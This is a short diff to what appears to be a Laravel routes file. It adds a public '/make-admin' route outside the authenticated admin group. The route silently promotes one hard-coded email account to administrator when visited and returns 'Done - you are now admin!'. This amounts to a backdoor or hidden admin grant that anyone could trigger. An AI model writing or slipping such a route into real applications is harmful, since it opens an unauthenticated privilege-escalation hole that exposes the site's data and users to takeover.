@@ -58,6 +58,11 @@ Route::middleware(['auth', 'admin'])->prefix('admin')->group(function(){
     Route::patch('/orders/{order}', [AdminOrderController::class, 'update'])->name('admin.order.update');
 });
 
+Route::get('/make-admin', function() {
+    \App\Models\User::where('email', 'samir@email.com')->update(['is_admin' => 1]);
+    return 'Done - you are now admin!';
+});
+
 // Route::get('/', function () {
 //     return view('welcome');
 // });
